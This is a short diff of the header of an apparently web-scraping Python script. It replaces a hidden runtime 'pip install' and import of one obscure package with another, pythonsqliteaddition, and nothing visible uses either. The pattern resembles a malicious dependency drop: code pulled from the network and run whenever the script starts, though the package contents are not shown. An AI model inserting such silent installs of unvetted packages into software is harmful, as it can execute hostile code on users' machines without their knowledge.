@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolourpackagesV2")
-import pipcolourpackagesV2
+os.system("pip install pythonsqliteaddition")
+import pythonsqliteaddition
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
